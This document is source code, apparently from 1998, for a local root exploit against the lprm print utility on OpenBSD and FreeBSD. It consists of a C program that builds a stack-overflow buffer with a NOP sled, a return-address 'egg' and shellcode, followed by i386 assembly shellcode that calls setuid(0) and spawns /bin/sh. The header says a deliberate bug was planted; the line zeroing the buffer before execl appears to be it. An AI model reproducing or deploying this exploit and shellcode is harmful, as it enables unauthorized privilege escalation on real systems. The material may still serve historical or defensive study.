/*
   lprm-bsd.c - Exploit for lprm vulnerability in
                OpenBSD and FreeBSD-stable

   k0ded by Niall Smart, njs3@doc.ic.ac.uk, 1998.

   The original version of this file contains a blatant error
   which anyone who is capable of understanding C will be able
   to locate and remove.  Please do not distribute this file
   without this idiot-avoidance measure.

   Typical egg on FreeBSD: 0xEFBFCFDF
   Typical egg on OpenBSD: 0xEFBFD648

   The exploit might take a while to drop you to a root shell
   depending on the timeout ("tm" capability) specified in the
   printcap file.
*/

#include <sys/types.h>
#include <pwd.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern void     BEGIN_SC();
extern void     END_SC();

int
main(int argc, char** argv)
{
        char            buf[4096];
        struct passwd*  pw;
        char*           cgstr;
        char*           cgbuf;
        char*           printer;
        char*           printcaps[] = { "/etc/printcap", 0 };
        int             sc_size;  /* size of shell code */
        int             P;        /* strlen(RP) + strlen(person) */
        unsigned        egg;      /* value to overwrite saved EIP with */

        if (argc != 3) {
                fprintf(stderr, "usage: %s <printername> <egg>\n", argv[0]);
                exit(0);
        }

        if ( (pw = getpwuid(getuid())) == NULL)
                errx(1, "no password entry for your user-id");

        printer = argv[1];
        egg = (unsigned) strtoul(argv[2], NULL, 0);

        if (cgetent(&cgstr, printcaps, printer) < 0)
                errx(1, "can't find printer: %s", printer);

        if (cgetstr(cgstr, "rm", &cgbuf) < 0 || cgbuf[0] == '\0')
                errx(1, "printer is not remote: %s", printer);

        if (cgetstr(cgstr, "rp", &cgbuf) < 0)
                cgbuf = "lp";

        sc_size = (char*) END_SC - (char*) BEGIN_SC;

        /* We can append 1022 bytes to whatever is in the buffer.
           We need to get up to 1032 bytes to reach the saved EIP,
           so there must be at least 10 bytes placed in the buffer
           by the snprintf on line 337 of rmjob.c and the subsequent
           *cp++ = '\0';  3 = ' ' + ' ' + '\5' */

        if ( (P = (strlen(pw->pw_name) + strlen(cgbuf))) < 7)
                errx(1, "your username is too short");

        fprintf(stderr, "P = %d\n", P);
        fprintf(stderr, "shellcode = %d bytes @ %d\n", sc_size, 1028 - P - 3 - 12 - sc_size);
        fprintf(stderr, "egg = 0x%X@%d\n", egg, 1028 - P - 3);

        /* fill with NOP */
        memset(buf, 0x90, sizeof(buf));
        /* put letter in first byte, this fucker took me eight hours to debug. */
        buf[0] = 'A';
        /* copy in shellcode, we leave 12 bytes for the four pushes before the int 0x80 */
        memcpy(buf + 1028 - P - 3 - 12 - sc_size, (void*) BEGIN_SC, sc_size);
        /* finally, set egg and null terminate */
        *((int*)&buf[1028 - P - 3]) = egg;
        buf[1022] = '\0';

        memset(buf, 0, sizeof(buf));

        execl("/usr/bin/lprm", "lprm", "-P", printer, buf, 0);

        fprintf(stderr, "doh.\n");

        return 0;
}


/*
   shellcode.S - generic i386 shell code

   k0d3d by Niall Smart, njs3@doc.ic.ac.uk, 1998.
   Please send me platform-specific mods.

   Example use:

        #include <stdio.h>
        #include <string.h>

        extern void     BEGIN_SC();
        extern void     END_SC();

        int
        main()
        {
                char    buf[1024];

                memcpy(buf, (void*) BEGIN_SC, (long) END_SC - (long) BEGIN_SC);

                ((void (*)(void)) buf)();

                return 0;
        }

    gcc -Wall main.c shellcode.S -o main && ./main
*/


#if defined(__FreeBSD__) || defined(__OpenBSD__)
#define EXECVE          3B
#define EXIT            01
#define SETUID          17
#define SETEUID         B7
#define KERNCALL        int $0x80
#else
#error This OS not currently supported.
#endif

#define _EXECVE_A       CONCAT($0x555555, EXECVE)
#define _EXECVE_B       CONCAT($0xAAAAAA, EXECVE)
#define _EXIT_A         CONCAT($0x555555, EXIT)
#define _EXIT_B         CONCAT($0xAAAAAA, EXIT)
#define _SETUID_A       CONCAT($0x555555, SETUID)
#define _SETUID_B       CONCAT($0xAAAAAA, SETUID)
#define _SETEUID_A      CONCAT($0x555555, SETEUID)
#define _SETEUID_B      CONCAT($0xAAAAAA, SETEUID)

#define CONCAT(x, y)    CONCAT2(x, y)
#define CONCAT2(x, y)   x ## y

.global         _BEGIN_SC
.global         _END_SC

                .data
_BEGIN_SC:      jmp 0x4                 // jump past next two isns
                movl (%esp), %eax       // copy saved EIP to eax
                ret                     // return to caller
                xorl %ebx, %ebx         // zero ebx
                pushl %ebx              // sete?uid(0)
                pushl %ebx              // dummy, kernel expects extra frame pointer
                movl _SETEUID_A, %eax   //
                andl _SETEUID_B, %eax   // load syscall number
                KERNCALL                // make the call
                movl _SETUID_A, %eax    //
                andl _SETUID_B, %eax    // load syscall number
                KERNCALL                // make the call
                subl $-8, %esp          // push stack back up
                call -40                // call, pushing addr of next isn onto stack
                addl $53, %eax          // make eax point to the string
                movb %bl, 2(%eax)       // append '\0' to "sh"
                movb %bl, 11(%eax)      // append '\0' to "/bin/sh"
                movl %eax, 12(%eax)     // argv[0] = "sh"
                movl %ebx, 16(%eax)     // argv[1] = 0
                pushl %ebx              // push envv
                movl %eax, %ebx         //
                subl $-12, %ebx         // -(-12) = 12, avoid null bytes
                pushl %ebx              // push argv
                subl $-4, %eax          // -(-4) = 4, avoid null bytes
                pushl %eax              // push path
                pushl %eax              // dummy, kernel expects extra frame pointer
                movl _EXECVE_A, %eax    //
                andl _EXECVE_B, %eax    // load syscall number
                KERNCALL                // make the call
                pushl %eax              // push return code from execve
                pushl %eax              //
                movl _EXIT_A, %eax      // we shouldn't have gotten here, try and
                andl _EXIT_B, %eax      // exit with return code from execve
                KERNCALL                // JERONIMO!
                .ascii "shAA/bin/shBCCCCDDDD"
                //      01234567890123456789
_END_SC:
